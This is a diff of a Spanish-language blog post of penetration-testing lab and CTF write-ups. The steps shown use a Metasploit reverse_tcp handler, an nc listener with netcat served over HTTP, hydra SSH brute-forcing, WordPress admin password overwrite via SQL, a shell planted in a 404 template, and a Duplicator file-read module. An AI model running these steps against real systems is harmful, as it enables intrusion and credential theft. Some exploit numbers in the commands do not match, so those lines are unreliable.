@@ -37,13 +37,17 @@
 <link rel="canonical" href="https://balo93.github.io/posts/explotacion-y-post-explotacion/" />
 <meta property="og:url" content="https://balo93.github.io/posts/explotacion-y-post-explotacion/" />
 <meta property="og:site_name" content="CyberBalo" />
+<meta property="og:image" content="https://balo93.github.io/assets/img/Primer-Blog/explotacion-post-explotacion.png" />
+<meta property="og:image:alt" content="Explotación y Post Explotación Labs" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2026-04-20T21:39:00-05:00" />
-<meta name="twitter:card" content="summary" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://balo93.github.io/assets/img/Primer-Blog/explotacion-post-explotacion.png" />
+<meta name="twitter:image:alt" content="Explotación y Post Explotación Labs" />
 <meta property="twitter:title" content="Explotación y Post Explotación" />
 <meta name="twitter:site" content="@alvarogbalo" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-04-22T00:01:39-05:00","datePublished":"2026-04-20T21:39:00-05:00","description":"Laboratorios.","headline":"Explotación y Post Explotación","mainEntityOfPage":{"@type":"WebPage","@id":"https://balo93.github.io/posts/explotacion-y-post-explotacion/"},"url":"https://balo93.github.io/posts/explotacion-y-post-explotacion/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-05-02T10:59:58-05:00","datePublished":"2026-04-20T21:39:00-05:00","description":"Laboratorios.","headline":"Explotación y Post Explotación","image":{"alt":"Explotación y Post Explotación Labs","url":"https://balo93.github.io/assets/img/Primer-Blog/explotacion-post-explotacion.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://balo93.github.io/posts/explotacion-y-post-explotacion/"},"url":"https://balo93.github.io/posts/explotacion-y-post-explotacion/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -518,6 +522,95 @@
     
       
       
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
     
 
     
@@ -1172,6 +1265,28 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
   
@@ -1270,18 +1385,27 @@
 
 <time
   
-  data-ts="1776834099"
+  data-ts="1777737598"
   data-df="DD/MM/YYYY"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  22/04/2026
+  02/05/2026
 </time>
 
         </span>
       
 
+      
+        
+        
+        
+
+        
+
+        <div class="mt-3 mb-3">
+          <a href="/assets/img/Primer-Blog/explotacion-post-explotacion.png" class="popup img-link preview-img shimmer"><img src="/assets/img/Primer-Blog/explotacion-post-explotacion.png"  alt="Explotación y Post Explotación Labs" width="1200" height="630"  loading="lazy"></a><figcaption class="text-center pt-2 pb-2">Explotación y Post Explotación Labs</figcaption></div>
       
 
       <div class="d-flex justify-content-between">
@@ -1319,9 +1443,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="1866 palabras"
+  title="2658 palabras"
 >
-  <em>10 min</em> de lectura</span>
+  <em>14 min</em> de lectura</span>
 
         </div>
       </div>
@@ -1404,7 +1528,7 @@ tmp/message
 <ul>
   <li>/ -&gt; busca en la raíz de todo el sistema</li>
   <li>-name -&gt; busca cualquier archivo con el nombre message</li>
-  <li>2&gt;/dev/null -&gt; envía todos los errores de permisis denegados a la carpeta null</li>
+  <li>2&gt;/dev/null -&gt; redirige los errores al dispositivo nulo para que no se muestren en pantalla</li>
 </ul>
 
 <p>Ahora como ya descubrimos que está el ejecutable en esa ruta podemos ver qué ficheros están ahí</p>
@@ -1467,7 +1591,7 @@ tmp/message
 </pre></td></tr></tbody></table></code></div></div>
 <p>Con esto hacemos que el usuario student tenga permiso de ejecutar cualquier binario sin contraseña al agregarlo en la última línea de sudoers con el comando <strong>»</strong>. Esperamos 1 minuto a que se ejecute el script y ya tenemos acceso sudo su.</p>
 
-<h2 id="exploting-setuid-programs"><span class="me-2">Exploting Setuid Programs</span><a href="#exploting-setuid-programs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h2 id="exploiting-setuid-programs"><span class="me-2">Exploiting Setuid Programs</span><a href="#exploiting-setuid-programs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <p>Para este laboratorio, nos dan un servicio activo en el puerto 8000, el cual tiene una webshell con un usuario student.</p>
 <div class="language-shell highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1494,7 +1618,7 @@ file welcome
 </pre></td></tr></tbody></table></code></div></div>
 
 <p>Con file podemos ver que welcome es un binario del tipo linux, similar a un exe en windows.
--rw<strong>S</strong>r significa que es un binario con SETUID al tener el bit <strong>“S”</strong> y es un binario que tiene un comportamiento especial, ya que cuando se ejecutan toman los permisos del propietario del archivo, en lugar del usuario que los ejecuta.</p>
+-rw<strong>S</strong>r significa que es un binario con SETUID al tener el bit <strong>“S”</strong> significa que el bit SUID está activo pero el archivo no tiene permisos de ejecución para ese usuario. Cuando es minúscula (“s”), tiene ambos.</p>
 
 <p>Para leer el binario welcome de forma legible, se utiliza el comando <strong>strings</strong></p>
 <div class="language-shell highlighter-rouge"><div class="code-header">
@@ -1502,7 +1626,7 @@ file welcome
       <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>strings welcome
 </pre></td></tr></tbody></table></code></div></div>
-<p>El comando muestra que dentro del binario está ejecutando greetings. Para probar se intenta eliminar el archivo greetings y lo logramos, lo que significa que nosotros podemos crear un archivo greetings nuestro para que lo ejecute welcome con sus privilegios.</p>
+<p>El comando muestra que dentro del binario esta ejecutando greetings. Para probar se intenta eliminar el archivo greetings y lo logramos, lo que significa que nosotros podemos crear un archivo greetings nuestro para que lo ejecute welcome con sus privilegios.</p>
 
 <div class="language-shell highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1588,7 +1712,7 @@ nmap <span class="nt">-p139</span>,445 <span class="nt">--script</span> smb-vuln
 <a href="/assets/img/Primer-Blog/enum.png" class="popup img-link shimmer"><img src="/assets/img/Primer-Blog/enum.png" alt="Enum4Linux" loading="lazy"></a>
 <em>Usuarios comunes de windows</em></p>
 
-<p>Los usuarios reales del equipo se encuentran más abajo, en la sección que se muestra a continuación:
+<p>Los usuarios reales del equipo se encuentran mas abajo, en la sección que se muestra a continuación:
 <a href="/assets/img/Primer-Blog/userenum.png" class="popup img-link shimmer"><img src="/assets/img/Primer-Blog/userenum.png" alt="Usuarios" loading="lazy"></a>
 <em>Usuarios encontrados en el sistema</em></p>
 
@@ -1660,7 +1784,7 @@ hydra <span class="nt">-L</span> user.txt <span class="nt">-P</span> /usr/share/
 <p><a href="/assets/img/Primer-Blog/systeminfo.png" class="popup img-link shimmer"><img src="/assets/img/Primer-Blog/systeminfo.png" alt="Systeminfo" loading="lazy"></a>
 <em>Crackmapexec_Systeminfo</em></p>
 
-<p>Luego de haber obtenido o recopilado la información necesaria, se procede a ejecutar un payload o un revershell en modo escucha, para ello nos apoyamos de multi/handles de msfconsole.</p>
+<p>Luego de haber obtenido o recopilado la información necesaria, se procede a ejecutar un payload o un revershell en modo escucha, para ello nos apoyamos de multi/handler de msfconsole.</p>
 
 <div class="language-shell highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1677,9 +1801,11 @@ use exploit/multi/handler
 <span class="nb">set </span>payload windows/x64/meterpreter/reverse_tcp
 run
 </pre></td></tr></tbody></table></code></div></div>
-<p>En LHost se debe poner nuestra dirección ip que tiene conexión IP con la máquina víctima.</p>
+<blockquote class="prompt-info">
+  <p><strong>Tip Profesional:</strong> Siempre verifica tu dirección IP con <code class="language-plaintext highlighter-rouge">ip addr</code> antes de configurar el <code class="language-plaintext highlighter-rouge">LHOST</code> en un payload.</p>
+</blockquote>
 
-<p>El paylod está conformado de la siguiente manera:
+<p>El payload está conformado de la siguiente manera:
     * Windows: Es para el sistema operativo que deseamos atacar.
     * x64: Es la arquitectura que tiene el sistema.
     * meterpreter: Genera una shell para msfconsole.
@@ -1815,7 +1941,7 @@ run
 use auxiliary/scanner/portscan/tcp
 <span class="nb">set </span>rhost 10.4.16.0/20
 <span class="nb">set </span>ports 445
-<span class="nb">set </span>threads 10 <span class="c">#No se recomienda poner más de 10</span>
+<span class="nb">set </span>threads 10 <span class="c">#No se recomienda poner mas de 10</span>
 run
 
 <span class="nb">set </span>rhost 10.4.25.90 <span class="c">#Porque ya conocemos la ip destino</span>
@@ -1851,7 +1977,7 @@ meterpreter&gt; portfwd add <span class="nt">-l</span> 445 <span class="nt">-p</
       <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>lsof <span class="nt">-i</span>:445
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/Primer-Blog/lsof.png" class="popup img-link shimmer"><img src="/assets/img/Primer-Blog/lsof.png" alt="LSOFT Conexión establecida" loading="lazy"></a>
+<p><a href="/assets/img/Primer-Blog/lsoft.png" class="popup img-link shimmer"><img src="/assets/img/Primer-Blog/lsoft.png" alt="LSOFT Conexión establecida" loading="lazy"></a>
 <em>Conexión establecida</em></p>
 
 <p>Ahora si yo quiero hacer un ping a dominio1.local, me va a seguir dando error ya que no tengo la ruta directa de llegar.</p>
@@ -1874,9 +2000,302 @@ smbclient //127.0.0.1/Documents <span class="nt">-U</span> administrator
   <p>Nota: Los recursos compartidos que tienen el <strong>$</strong> no son muy importantes, se debe acceder a los que no tienen ese símbolo.</p>
 </blockquote>
 
+<p>En resumen:</p>
+
+<div class="table-wrapper"><table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Comando</th>
+      <th style="text-align: left">Propósito</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">autoroute</code></td>
+      <td style="text-align: left">Enseña a Metasploit cómo llegar a la red interna.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">portfwd</code></td>
+      <td style="text-align: left">Mapea un puerto remoto a un puerto local en tu máquina Kali.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">socks_proxy</code></td>
+      <td style="text-align: left">(Opcional) Permite usar herramientas externas a través del túnel.</td>
+    </tr>
+  </tbody>
+</table></div>
+
 <h2 id="fixing-exploits"><span class="me-2">Fixing Exploits.</span><a href="#fixing-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>En este laboratorio se encuentra un exploit público.
-Video 02:06</p>
+<p>En este laboratorio se trata de encontrar exploits disponibles públicamente con Searchsploit y aprender cómo corregir o modificar exploits para lograr que funcionen según lo previsto.</p>
+
+<p>Lo primero es realizar un escaneo de puertos:</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> dominio.local
+    80/tcp open
+    135/tcp open
+    139/tcp open
+    445/tcp open
+    3389/tcp open
+    5985/tcp open
+    47001/tcp open
+
+nmap <span class="nt">-p80</span>,135,445,3389,5985 <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> dominio.local
+
+searchsploit hfs2.3
+searchsploit <span class="nt">-m</span> 39161
+<span class="nb">cat </span>39161.py
+nano 39161.py
+    ip_addr <span class="o">=</span> <span class="s2">"ip_local"</span> <span class="c">#Colocar ip actual de kali</span>
+
+python 39162.py &lt;ip_víctima&gt; 80
+</pre></td></tr></tbody></table></code></div></div>
+<p>Ahora como es un exploit, antes de ejecutarlo, debemos dejar un escucha abierto para conectarnos al equipo víctima.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>python3 <span class="nt">-m</span> http.server 80 <span class="c">#Descargar netcat.exe</span>
+    <span class="s2">"GET"</span>
+
+
+nc <span class="nt">-nlvp</span> 443 <span class="c">#Listener para conectarnos</span>
+    <span class="o">&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con esto se completa el laboratorio.</p>
+
+<h2 id="targeting-mysql-database-server"><span class="me-2">Targeting MySql Database Server</span><a href="#targeting-mysql-database-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>En este laboratorio se demostrará las técnicas de explotación a una base de datos como lo es MySql.</p>
+
+<p>Para empezar se realiza un escaneo de puertos</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 3306 dominio.local
+</pre></td></tr></tbody></table></code></div></div>
+<blockquote class="prompt-warning">
+  <p>NOTA: En algunos casos la base de datos MySql no se encuentra en el puerto 3306.</p>
+</blockquote>
+
+<p>Al saber la versión se puede buscar alguna vulnerabilidad en searchexploit. En este caso al no haber un script útil, se procede con msfconsole.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>msfconsole
+use auxiliary/scanner/mysql/mysql_login
+    <span class="nb">set </span>RHOSTS dominio.local
+    <span class="nb">set </span>PASS_FILE /usr/share/wordlists/metasploit/unix_password.txt
+    run
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Luego de encontrar credenciales válidas se procede a conectar a la base de datos</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>mysql <span class="nt">-u</span> root <span class="nt">-p</span> <span class="nt">-h</span> dominio.local
+    show databases<span class="p">;</span> <span class="c">#Muestra las bases de datos</span>
+    use wordpress<span class="p">;</span>
+    show tables<span class="p">;</span>
+    <span class="k">select</span> <span class="k">*</span> FROM wp_users<span class="p">;</span>
+    UPDATE wp_users SET user_pass <span class="o">=</span> MD5<span class="o">(</span><span class="s1">'password12345'</span><span class="o">)</span> WHERE user_login <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<blockquote class="prompt-warning">
+  <p>Nota: Al hacer la consulta UPDATE se actualizará la contraseña actual del usuario admin, tener en cuenta.</p>
+</blockquote>
+
+<p>En estas bases de datos ya podemos saber que servicios se encuentran activos, en este caso encontramos un wordpress y se procede a acceder desde el navegador; al no encontrar la página de login, se procede a realizar un escaneo de directorios.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://dominio.com:8585/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>Al tener usuario y contraseña se accede a Wordpress y en el archivo 404, podemos cargar un bash, y dejar un puerto escucha, con eso al abrir una web que no exista, haremos ejecutar el script.</p>
+
+<p>Con esto finaliza este laboratorio.</p>
+
+<h2 id="host--network-penetration-testing-exploitation-ctf-1"><span class="me-2">Host &amp; Network Penetration Testing: Exploitation CTF 1.</span><a href="#host--network-penetration-testing-exploitation-ctf-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>En este laboratorio de habilidades, se tienen dos máquinas accesibles dominio1.local y dominio2.local, en los cuales debemos identificar las aplicaciones y servicios que se están ejecutando.
+Primero se procede hacer un ping a cada dominio para saber si tenemos acceso o no.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>ping dominio1.local
+ping dominio2.local
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Ahora se procede con un escaneo de puertos</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 3000 dominio1.local
+
+whatweb http://dominio1.local/acp/
+
+searchsploit flatcore
+searchsploit <span class="nt">-m</span> 50262
+    <span class="nb">cat </span>20262.py
+
+python3 20262.py https://dominio1.local/ admin password1
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con esto logramos acceder al sistema, cabe recalcar, que en este laboratorio nos dieron el usuario y contraseña.</p>
+
+<p>La primera bandera solicita encontrar la flag en la raiz.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span>
+<span class="nv">$ </span><span class="nb">whoami</span>
+<span class="nv">$ </span><span class="nb">pwd</span>
+<span class="nv">$ </span><span class="nb">ls</span> /
+<span class="nv">$ </span><span class="nb">cat </span>flag1.txt
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Lo segundo es identificar un usuario del sistema inseguro.</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="nb">ls</span> <span class="nt">-l</span> /home
+    iamaweakuser
+<span class="nb">exit
+
+</span>hydra <span class="nt">-l</span> iamweakuser <span class="nt">-P</span> /usr/share/metasploit-framework/data/wordlists/unix_password.txt ssh://dominio1.local
+    iamweakuser angel
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Con hydra se ha descubierto la contraseña, ahora debemos conectarnos mediante ssh</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>ssh iamweakuser@dominio1.local
+    angel
+    <span class="nb">ls
+        </span>flag2.txt
+    <span class="nb">cat </span>flag2.txt
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>La tercera flag solicita identificar y vulnerar un plugin vulnerable utilizado por la aplicación en el dominio2.local.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 3000 dominio2.local
+wpscan <span class="nt">--api-token</span> &lt;Insertar token&gt; <span class="c">#El api token se puede sacar de la página oficial de wpscan</span>
+nikto <span class="nt">-h</span> dominio2.local
+    akismet
+searchsploit akismet <span class="c">#No hay algo que se pueda aprovechar</span>
+
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://dominio2.local/wp-content/plugins/ <span class="nt">-w</span> /usr/share/nmap/nselib/data/wp-plugins.lst <span class="c">#Diccionario de plugins</span>
+    akismet
+    duplikator
+</pre></td></tr></tbody></table></code></div></div>
+<p>Como se encontró 2 plugins, se procede a acceder a dicha ruta</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>http://dominio2.local/wp-content/plugins/duplicator/
+
+searchsploit duplicator
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con searchsploit se encontró varias vulnerabilidades por lo que se procede con msfconsole</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>msfconsole <span class="nt">-q</span>
+search duplicator
+    use auxiliary/scanner/http/wp_duplicator_file_read
+        <span class="nb">set </span>RHOSTS dominio2.local
+        <span class="nb">set </span>FILEPATH /flag3.txt
+        run
+        flag3.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>Para la última flag solicitan identificar y comprometer un usuario del sistema que no requiere autenticación. Antes de establecer el FILEPATH, se hizo por default un escaneo a /etc/shadows, donde se encontró un usuario llamado “iamacreazyfreeuser”.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>ssh iamacreazyfreeuser@dominio2.local
+    <span class="nb">yes</span>
+    <span class="nv">$ </span><span class="nb">ls</span>
+    <span class="nv">$ </span>flag4.txt
+    <span class="nv">$ </span><span class="nb">cat </span>flag4.txt
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con eso se termina de encontrar las 4 flags del laboratorio.</p>
 
   </div>
 
@@ -1905,7 +2324,8 @@ Video 02:06</p>
         
           <a href="/categories/hacking/">Hacking</a>,
           <a href="/categories/vulnerabilidades/">Vulnerabilidades</a>,
-          <a href="/categories/explotaci%C3%B3n/">Explotación</a>
+          <a href="/categories/explotaci%C3%B3n/">Explotación</a>,
+          <a href="/categories/pivoting/">Pivoting</a>
       </div>
     
 
@@ -1913,23 +2333,19 @@ Video 02:06</p>
       <div class="post-tags">
         <i class="fa fa-tags fa-fw me-1"></i>
         
-          <a href="/tags/shellshock/" class="post-tag no-text-decoration">shellshock</a>
-        
           <a href="/tags/metasploit/" class="post-tag no-text-decoration">Metasploit</a>
         
-          <a href="/tags/privesc/" class="post-tag no-text-decoration">privesc</a>
+          <a href="/tags/cron-jobs/" class="post-tag no-text-decoration">cron jobs</a>
         
-          <a href="/tags/webdav/" class="post-tag no-text-decoration">webdav</a>
+          <a href="/tags/nikto/" class="post-tag no-text-decoration">nikto</a>
+        
+          <a href="/tags/wordpress/" class="post-tag no-text-decoration">wordpress</a>
         
           <a href="/tags/cracking/" class="post-tag no-text-decoration">cracking</a>
         
-          <a href="/tags/kiwi/" class="post-tag no-text-decoration">kiwi</a>
+          <a href="/tags/hydra/" class="post-tag no-text-decoration">hydra</a>
         
-          <a href="/tags/incognito/" class="post-tag no-text-decoration">incognito</a>
-        
-          <a href="/tags/powersploit/" class="post-tag no-text-decoration">powersploit</a>
-        
-          <a href="/tags/john/" class="post-tag no-text-decoration">john</a>
+          <a href="/tags/nselib/" class="post-tag no-text-decoration">nselib</a>
         
       </div>
     
@@ -2147,30 +2563,6 @@ Video 02:06</p>
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2204,32 +2596,6 @@ Video 02:06</p>
     
     
     
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2270,25 +2636,6 @@ Video 02:06</p>
     
     
     
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
   
     
     
@@ -2318,18 +2665,6 @@ Video 02:06</p>
     
     
     
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2341,139 +2676,6 @@ Video 02:06</p>
     
     
     
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2509,6 +2711,94 @@ Video 02:06</p>
     
     
     
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
     
   
@@ -2533,7 +2823,30 @@ Video 02:06</p>
     
     
     
-      
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
     
   
     
@@ -2542,6 +2855,50 @@ Video 02:06</p>
     
       
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
   
     
     
@@ -2592,19 +2949,19 @@ Video 02:06</p>
         <a class="post-tag btn btn-outline-primary" href="/tags/hydra-y-crackmapexec/">Hydra y CrackMapExec</a>
       
         
-        <a class="post-tag btn btn-outline-primary" href="/tags/incognito/">incognito</a>
-      
-        
